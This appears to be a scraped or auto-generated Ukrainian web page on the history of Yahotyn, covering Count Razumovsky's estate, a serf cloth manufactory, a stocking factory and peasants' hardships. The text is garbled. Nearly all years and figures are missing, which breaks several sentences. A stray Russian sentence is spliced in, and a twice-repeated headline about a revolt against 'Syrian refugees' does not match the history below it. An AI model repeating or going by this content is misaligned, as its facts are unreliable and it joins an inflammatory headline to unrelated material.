<p>
<p>Усередині надзвичайно простора і світла. Поверхностные замечания по дороге от Москвы в Малороссию к осени г.</p><strong><a id='c1'></a><h2>На Київщині бунт проти «сирійських біженців». Хто «накручує» яготинців?</h2></strong><p>Та на жаль, в р. Зараз ведуться роботи по його відновленню. Було споруджено й ряд промислових підприємств. Німець Штром заснував році панчішну фабрику на місцевій сировині, де діти яготинських кріпаків на двох верстатах виготовляли рукавиці, повстяні і шовкові панчохи. За даними року, більшість яготинців — близько осіб — були кріпаки й лише належали до козаків.</p>
<p>На кріпосній суконній мануфактурі робітників виготовляли за рік до аршин тонкого й грубого «солдатського» сукна, вартість виробленої продукції досягала 60 тис. Готове сукно продавало на Прилуцьких, Харківських та інших ярмарках України. В наступні роки за планом архітектора Менеласа збудовано розкішний палац з павільйонами. Запрошений з Франції садівник Пельц спланував англійський парк, теплиці, оранжереї з заморськими рослинами, виноградник, побудував погреби для зберігання вина. Все це було разючим контрастом до тих умов, у яких жили селяни.</p><strong><a id='c2'></a><h2>На Київщині бунт проти «сирійських біженців». Хто «накручує» яготинців?</h2></strong><p>Лікар графа Розумовського німець Отто фон Гун у своїх спогадах розповідав про скрутне матеріальне становище кріпаків, убогість плетених з лози і обмазаних глиною хат, з малесенькими напівпрозорими віконцями. Пан та управителі маєтком за найменшу провину жорстоко карали селян. В ній стояв дубовий ослін та лежали різки. У році Яготинський маєток з душами селян-кріпаків перейшов до князя М. Рєпніна-Волконського, як посаг за дружиною — В. Рєпнін — був високоосвіченою людиною передових на той час поглядів і обіймав високі посади.</p>
		
